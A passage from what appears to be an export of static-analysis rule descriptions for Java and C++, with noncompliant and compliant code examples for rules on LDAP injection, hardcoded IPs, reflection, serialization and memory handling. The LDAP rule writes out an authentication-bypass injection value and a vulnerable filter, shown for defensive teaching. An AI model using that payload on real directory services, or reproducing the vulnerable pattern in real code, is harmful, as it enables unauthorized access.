<p>This rule doesn't raise any issue on annotated field.</p>",squid:S1450,java,Java,"<p>When the value of a private field is always assigned to in a class' methods before being read, then it is not being used to store class
information. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private int a;
  private int b;

  public void doSomething(int y) {
    a = y + 5;
    ...
    if(a == 0) {
      ...
    }
    ...
  }

  public void doSomethingElse(int y) {
    b = y + 3;
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {

  public void doSomething(int y) {
    int a = y + 5;
    ...
    if(a == 0) {
      ...
    }
  }

  public void doSomethingElse(int y) {
    int b = y + 3;
    ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise any issue on annotated field.</p>",Private fields only used as local variables in methods should become local variables,[],MINOR,['pitfall'],CODE_SMELL
2013-10-18T18:10:15+0200,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String ip = ""192.168.12.42""; // Noncompliant
Socket socket = new Socket(ip, 6667);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=""http://www.oid-info.com/introduction.htm"">often match
  Object Identifiers</a> (OID). </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",squid:S1313,java,Java,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String ip = ""192.168.12.42""; // Noncompliant
Socket socket = new Socket(ip, 6667);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=""http://www.oid-info.com/introduction.htm"">often match
  Object Identifiers</a> (OID). </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",Using hardcoded IP addresses is security-sensitive,[],MINOR,['cert'],SECURITY_HOTSPOT
2015-01-08T13:39:43+0100,"<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing LDAP names or search filters directly
from tainted data enables attackers to inject specially crafted values that changes the initial meaning of the name or filter itself. Successful LDAP
injections attacks can read, modify or delete sensitive information from the directory service.</p>
<p>Within LDAP names, the special characters <code>' '</code>, <code>'#'</code>, <code>'""'</code>, <code>'+'</code>, <code>','</code>,
<code>';'</code>, <code>'&lt;'</code>, <code>'&gt;'</code>, <code>'\'</code> and <code>null</code> must be escaped according to RFC 4514, for example
by replacing them with the backslash character <code>'\'</code> followed by the two hex digits corresponding to the ASCII code of the character to be
escaped. Similarly, LDAP search filters must escape a different set of special characters (including but not limited to <code>'*'</code>,
<code>'('</code>, <code>')'</code>, <code>'\'</code> and <code>null</code>) according to RFC 4515.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, DirContext ctx) throws NamingException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String filter = ""(&amp;(uid="" + user + "")(userPassword="" + pass + ""))""; // Unsafe

  // If the special value ""*)(uid=*))(|(uid=*"" is passed as user, authentication is bypassed
  // Indeed, if it is passed as a user, the filter becomes:
  // (&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=...))
  // as uid=* match all users, it is equivalent to:
  // (|(uid=*)(userPassword=...))
  // again, as uid=* match all users, the filter becomes useless

  NamingEnumeration&lt;SearchResult&gt; results = ctx.search(""ou=system"", filter, new SearchControls()); // Noncompliant
  return results.hasMore();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, DirContext ctx) throws NamingException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String filter = ""(&amp;(uid={0})(userPassword={1}))""; // Safe

  NamingEnumeration&lt;SearchResult&gt; results = ctx.search(""ou=system"", filter, new String[]{user, pass}, new SearchControls());
  return results.hasMore();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.ietf.org/rfc/rfc4514.txt"">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href=""https://www.ietf.org/rfc/rfc4515.txt"">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/90"">MITRE CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/CgLEAw"">CERT, IDS54-J.</a> - Prevent LDAP injection </li>
</ul>",squid:S2078,java,Java,"<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing LDAP names or search filters directly
from tainted data enables attackers to inject specially crafted values that changes the initial meaning of the name or filter itself. Successful LDAP
injections attacks can read, modify or delete sensitive information from the directory service.</p>
<p>Within LDAP names, the special characters <code>' '</code>, <code>'#'</code>, <code>'""'</code>, <code>'+'</code>, <code>','</code>,
<code>';'</code>, <code>'&lt;'</code>, <code>'&gt;'</code>, <code>'\'</code> and <code>null</code> must be escaped according to RFC 4514, for example
by replacing them with the backslash character <code>'\'</code> followed by the two hex digits corresponding to the ASCII code of the character to be
escaped. Similarly, LDAP search filters must escape a different set of special characters (including but not limited to <code>'*'</code>,
<code>'('</code>, <code>')'</code>, <code>'\'</code> and <code>null</code>) according to RFC 4515.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, DirContext ctx) throws NamingException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String filter = ""(&amp;(uid="" + user + "")(userPassword="" + pass + ""))""; // Unsafe

  // If the special value ""*)(uid=*))(|(uid=*"" is passed as user, authentication is bypassed
  // Indeed, if it is passed as a user, the filter becomes:
  // (&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=...))
  // as uid=* match all users, it is equivalent to:
  // (|(uid=*)(userPassword=...))
  // again, as uid=* match all users, the filter becomes useless

  NamingEnumeration&lt;SearchResult&gt; results = ctx.search(""ou=system"", filter, new SearchControls()); // Noncompliant
  return results.hasMore();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, DirContext ctx) throws NamingException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String filter = ""(&amp;(uid={0})(userPassword={1}))""; // Safe

  NamingEnumeration&lt;SearchResult&gt; results = ctx.search(""ou=system"", filter, new String[]{user, pass}, new SearchControls());
  return results.hasMore();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.ietf.org/rfc/rfc4514.txt"">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href=""https://www.ietf.org/rfc/rfc4515.txt"">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/90"">MITRE CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/CgLEAw"">CERT, IDS54-J.</a> - Prevent LDAP injection </li>
</ul>",LDAP queries should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1']",VULNERABILITY
2018-09-06T11:04:31+0200,"<p>Changing or bypassing accessibility is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681"">CVE-2012-4681</a> </li>
</ul>
<p><code>private</code> methods were made <code>private</code> for a reason, and the same is true of every other visibility level. Altering or
bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could introduce security holes.</p>
<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is a good reason to override the existing accessibility level of the method/field. This is very rarely the case. Accessing hidden fields
  and methods will make your code unstable as they are not part of the public API and may change in future versions. </li>
  <li> this method is called by untrusted code. <strong>*</strong> </li>
  <li> it is possible to modify or bypass the accessibility of sensitive methods or fields using this code. <strong>*</strong> </li>
  <li> untrusted code can access the java reflection API. <strong>*</strong> </li>
</ul>
<p><strong>*</strong> You are at risk if you answered yes to those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don't change or bypass the accessibility of any method or field if possible.</p>
<p>If untrusted code can execute this method, make sure that it cannot decide which method or field's accessibility can be modified or bypassed.</p>
<p>Untrusted code should never have direct access to the java Reflection API. If this method can do it, make sure that it is an exception. Use
ClassLoaders and SecurityManagers in order to sandbox any untrusted code and forbid access to the Reflection API.</p>
<h2>Questionable Code Example</h2>
<pre>
public void makeItPublic(String methodName) throws NoSuchMethodException {

  this.getClass().getMethod(methodName).setAccessible(true); // Questionable
}

public void setItAnyway(String fieldName, int value) {
  this.getClass().getDeclaredField(fieldName).setInt(this, value); // Questionable; bypasses controls in setter
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3YEVAQ"">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of
  classes, methods, or fields </li>
</ul>",squid:S3011,java,Java,"<p>Changing or bypassing accessibility is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681"">CVE-2012-4681</a> </li>
</ul>
<p><code>private</code> methods were made <code>private</code> for a reason, and the same is true of every other visibility level. Altering or
bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could introduce security holes.</p>
<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is a good reason to override the existing accessibility level of the method/field. This is very rarely the case. Accessing hidden fields
  and methods will make your code unstable as they are not part of the public API and may change in future versions. </li>
  <li> this method is called by untrusted code. <strong>*</strong> </li>
  <li> it is possible to modify or bypass the accessibility of sensitive methods or fields using this code. <strong>*</strong> </li>
  <li> untrusted code can access the java reflection API. <strong>*</strong> </li>
</ul>
<p><strong>*</strong> You are at risk if you answered yes to those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don't change or bypass the accessibility of any method or field if possible.</p>
<p>If untrusted code can execute this method, make sure that it cannot decide which method or field's accessibility can be modified or bypassed.</p>
<p>Untrusted code should never have direct access to the java Reflection API. If this method can do it, make sure that it is an exception. Use
ClassLoaders and SecurityManagers in order to sandbox any untrusted code and forbid access to the Reflection API.</p>
<h2>Questionable Code Example</h2>
<pre>
public void makeItPublic(String methodName) throws NoSuchMethodException {

  this.getClass().getMethod(methodName).setAccessible(true); // Questionable
}

public void setItAnyway(String fieldName, int value) {
  this.getClass().getDeclaredField(fieldName).setInt(this, value); // Questionable; bypasses controls in setter
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3YEVAQ"">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of
  classes, methods, or fields </li>
</ul>",Changing or bypassing accessibility is security-sensitive,[],CRITICAL,"['cert', 'owasp-a3']",SECURITY_HOTSPOT
2015-02-17T07:18:47+0100,"<p>A <code>serialVersionUID</code> field is strongly recommended in all <code>Serializable</code> classes. If you do not provide one, one will be
calculated for you by the compiler. The danger in not explicitly choosing the value is that when the class changes, the compiler will generate an
entirely new id, and you will be suddenly unable to deserialize (read from file) objects that were serialized with the previous version of the
class.</p>
<p><code>serialVersionUID</code>'s should be declared with all of these modifiers: <code>static final long</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Raspberry extends Fruit  // Noncompliant; no serialVersionUID.
        implements Serializable {
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}

public class Raspberry extends Fruit
        implements Serializable {
  private final int serialVersionUID = 1; // Noncompliant; not static &amp; int rather than long
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Raspberry extends Fruit
        implements Serializable {
  private static final long serialVersionUID = 1;
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>
<h2>Exceptions</h2>
<p>Swing and AWT classes, <code>abstract</code> classes, <code>Throwable</code> and its subclasses (<code>Exception</code>s and <code>Error</code>s),
and classes marked with <code>@SuppressWarnings(""serial"")</code> are ignored.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYCpAQ"">CERT, SER00-J.</a> - Enable serialization compatibility during class evolution
  </li>
</ul>",squid:S2057,java,Java,"<p>A <code>serialVersionUID</code> field is strongly recommended in all <code>Serializable</code> classes. If you do not provide one, one will be
calculated for you by the compiler. The danger in not explicitly choosing the value is that when the class changes, the compiler will generate an
entirely new id, and you will be suddenly unable to deserialize (read from file) objects that were serialized with the previous version of the
class.</p>
<p><code>serialVersionUID</code>'s should be declared with all of these modifiers: <code>static final long</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Raspberry extends Fruit  // Noncompliant; no serialVersionUID.
        implements Serializable {
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}

public class Raspberry extends Fruit
        implements Serializable {
  private final int serialVersionUID = 1; // Noncompliant; not static &amp; int rather than long
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Raspberry extends Fruit
        implements Serializable {
  private static final long serialVersionUID = 1;
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>
<h2>Exceptions</h2>
<p>Swing and AWT classes, <code>abstract</code> classes, <code>Throwable</code> and its subclasses (<code>Exception</code>s and <code>Error</code>s),
and classes marked with <code>@SuppressWarnings(""serial"")</code> are ignored.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYCpAQ"">CERT, SER00-J.</a> - Enable serialization compatibility during class evolution
  </li>
</ul>","""Serializable"" classes should have a ""serialVersionUID""",[],CRITICAL,"['cert', 'pitfall', 'serialization']",CODE_SMELL
2018-02-14T07:15:15+0100,"<p>When using the <code>Stream</code> API, call chains should be simplified as much as possible to improve readability and maintainability.</p>
<p>This rule raises an issue when one of the following substitution can be made:</p>
<table>
  <tbody>
    <tr>
      <th>Original</th>
      <th>Preferred</th>
    </tr>
    <tr>
      <td><code>stream.collect(counting())</code></td>
      <td><code>stream.count()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(maxBy(comparator))</code></td>
      <td><code>stream.max(comparator)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(minBy(comparator))</code></td>
      <td><code>stream.min(comparator)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(mapping(mapper))</code></td>
      <td><code>stream.map(mapper).collect()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(reducing(...))</code></td>
      <td><code>stream.reduce(...)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingInt(mapper))</code></td>
      <td><code>stream.mapToInt(mapper).sum()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingLong(mapper))</code></td>
      <td><code>stream.mapToLong(mapper).sum()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingDouble(mapper))</code></td>
      <td><code>stream.mapToDouble(mapper).sum()</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
int count = stream.collect(counting());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int count = stream.count();
</pre>",squid:S4266,java,Java,"<p>When using the <code>Stream</code> API, call chains should be simplified as much as possible to improve readability and maintainability.</p>
<p>This rule raises an issue when one of the following substitution can be made:</p>
<table>
  <tbody>
    <tr>
      <th>Original</th>
      <th>Preferred</th>
    </tr>
    <tr>
      <td><code>stream.collect(counting())</code></td>
      <td><code>stream.count()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(maxBy(comparator))</code></td>
      <td><code>stream.max(comparator)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(minBy(comparator))</code></td>
      <td><code>stream.min(comparator)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(mapping(mapper))</code></td>
      <td><code>stream.map(mapper).collect()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(reducing(...))</code></td>
      <td><code>stream.reduce(...)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingInt(mapper))</code></td>
      <td><code>stream.mapToInt(mapper).sum()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingLong(mapper))</code></td>
      <td><code>stream.mapToLong(mapper).sum()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingDouble(mapper))</code></td>
      <td><code>stream.mapToDouble(mapper).sum()</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
int count = stream.collect(counting());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int count = stream.count();
</pre>","""Stream.collect()"" calls should not be redundant",[],MINOR,['clumsy'],CODE_SMELL
2017-05-05T12:32:52+0200,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; ""a"" is always ""true""
  doSomething();
}

if (c || !a) { // Noncompliant; ""!a"" is always ""false""
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",cpp:S2589,cpp,C++,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; ""a"" is always ""true""
  doSomething();
}

if (c || !a) { // Noncompliant; ""!a"" is always ""false""
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Boolean expressions should not be gratuitous,[],MAJOR,"['cert', 'cwe', 'misra', 'redundant']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all namespace names match a provided regular expression.
</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>[a-z][a-z_0-9]*</code>:</p>
<pre>
namespace Foo // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace foo
{
}
</pre>",cpp:NamespaceName,cpp,C++,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all namespace names match a provided regular expression.
</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>[a-z][a-z_0-9]*</code>:</p>
<pre>
namespace Foo // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace foo
{
}
</pre>",Namespace names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the namespace names against', 'defaultValue': '[a-z][a-z_0-9]*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2019-02-26T09:19:32+0100,"<p>Taking the address of a library function is not something robust: The library might make changes to a function that are compatible with a normal
use of a function, but not with taking its address (for instance, adding a parameter with a default value, or adding an overload to an overload set).
More specifically, the standard library has stated that there would be no barrier against such changes, and that for stability users should not take
the address of standard library functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main() {
  std::unique_ptr&lt;FILE, int(*)(FILE*)&gt; fp(
    fopen(""test.txt"", ""r""),
    fclose); // Non compliant, address of fclose is implicitly taken
  // Work with fp
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int main() {
  std::unique_ptr&lt;FILE, int(*)(FILE*)&gt; fp(
    fopen(""test.txt"", ""r""),
    [](FILE*file){return fclose(file);});
  // Work with fp
}
</pre>
<h2>See</h2>
<ul>
  <li> https://wg21.link/P0921 Document of the C++ standardization committee about change management in the standard library. </li>
</ul>",cpp:S5180,cpp,C++,"<p>Taking the address of a library function is not something robust: The library might make changes to a function that are compatible with a normal
use of a function, but not with taking its address (for instance, adding a parameter with a default value, or adding an overload to an overload set).
More specifically, the standard library has stated that there would be no barrier against such changes, and that for stability users should not take
the address of standard library functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main() {
  std::unique_ptr&lt;FILE, int(*)(FILE*)&gt; fp(
    fopen(""test.txt"", ""r""),
    fclose); // Non compliant, address of fclose is implicitly taken
  // Work with fp
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int main() {
  std::unique_ptr&lt;FILE, int(*)(FILE*)&gt; fp(
    fopen(""test.txt"", ""r""),
    [](FILE*file){return fclose(file);});
  // Work with fp
}
</pre>
<h2>See</h2>
<ul>
  <li> https://wg21.link/P0921 Document of the C++ standardization committee about change management in the standard library. </li>
</ul>",The addresses of standard library functions should not be taken,[],CRITICAL,['pitfall'],BUG
2019-02-26T09:19:32+0100,"<p>The RAII idiom associates the lifetime of a resource with the lifetime of an object: The resource is acquired when the object is created, and
released when it is destroyed.</p>
<p>If the object that controls the resource lifetime is a temporary, chances are that it will get destroyed while the resource should still be in use,
leading to resource corruption. This rules detects temporaries that look like RAII objects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f() {
  scoped_lock(&amp;myMutex); // Non compliant. The mutex will be locked then immediately unlocked
  protectedCode(); // This code is not protected by the mutex
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f() {
  scoped_lock lock(&amp;myMutex); // Compliant
  protectedCode();
  // The mutex is correctly released at this point
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#es84-dont-try-to-declare-a-local-variable-with-no-name"">C++ core
  guidelines ES.84</a> DonÃ¢â‚¬â„¢t (try to) declare a local variable with no name </li>
</ul>",cpp:S5184,cpp,C++,"<p>The RAII idiom associates the lifetime of a resource with the lifetime of an object: The resource is acquired when the object is created, and
released when it is destroyed.</p>
<p>If the object that controls the resource lifetime is a temporary, chances are that it will get destroyed while the resource should still be in use,
leading to resource corruption. This rules detects temporaries that look like RAII objects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f() {
  scoped_lock(&amp;myMutex); // Non compliant. The mutex will be locked then immediately unlocked
  protectedCode(); // This code is not protected by the mutex
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f() {
  scoped_lock lock(&amp;myMutex); // Compliant
  protectedCode();
  // The mutex is correctly released at this point
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#es84-dont-try-to-declare-a-local-variable-with-no-name"">C++ core
  guidelines ES.84</a> DonÃ¢â‚¬â„¢t (try to) declare a local variable with no name </li>
</ul>",RAII objects should not be temporary,[],BLOCKER,['suspicious'],VULNERABILITY
2014-05-24T08:26:46+0200,"<p>The <code>malloc</code>, <code>realloc</code>, <code>calloc</code> and <code>free</code> routines are used to dynamically allocate memory in the
heap. But, in contrast to the <code>new</code> and <code>delete</code> operators introduced in C++, they allocate raw memory, which is not type-safe,
and they do not correctly invoke object constructors. Additionally, mixing them with <code>new</code>/<code>delete</code> results in undefined
behavior.</p>
<p>Note that directly replacing those functions with <code>new</code>/<code>delete</code> is usually not a good idea (see S5025).</p>
<h2>Noncompliant Code Example</h2>
<pre>
string* pStringArray1 = static_cast&lt;string*&gt;(malloc(10 * sizeof(string))); // Noncompliant
Person *p = (Person*)malloc(sizeof(Person)); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
std::array&lt;string, 10&gt; stringArray1 ; // Compliant, use std::vector instead if the size is dynamic
auto p1 = new Person(""Bjarne""); // Compliant, but don't do that, prefer the version on next line
auto p2 = std::make_unique&lt;Person&gt;(""Bjarne""); // Compliant
</pre>
<h2>See</h2>
<p> * <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#r10-avoid-malloc-and-free"">C++ core guidelines R.10</a> Avoid malloc() and
free()</p>",cpp:S1231,cpp,C++,"<p>The <code>malloc</code>, <code>realloc</code>, <code>calloc</code> and <code>free</code> routines are used to dynamically allocate memory in the
heap. But, in contrast to the <code>new</code> and <code>delete</code> operators introduced in C++, they allocate raw memory, which is not type-safe,
and they do not correctly invoke object constructors. Additionally, mixing them with <code>new</code>/<code>delete</code> results in undefined
behavior.</p>
<p>Note that directly replacing those functions with <code>new</code>/<code>delete</code> is usually not a good idea (see S5025).</p>
<h2>Noncompliant Code Example</h2>
<pre>
string* pStringArray1 = static_cast&lt;string*&gt;(malloc(10 * sizeof(string))); // Noncompliant
Person *p = (Person*)malloc(sizeof(Person)); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
std::array&lt;string, 10&gt; stringArray1 ; // Compliant, use std::vector instead if the size is dynamic
auto p1 = new Person(""Bjarne""); // Compliant, but don't do that, prefer the version on next line
auto p2 = std::make_unique&lt;Person&gt;(""Bjarne""); // Compliant
</pre>
<h2>See</h2>
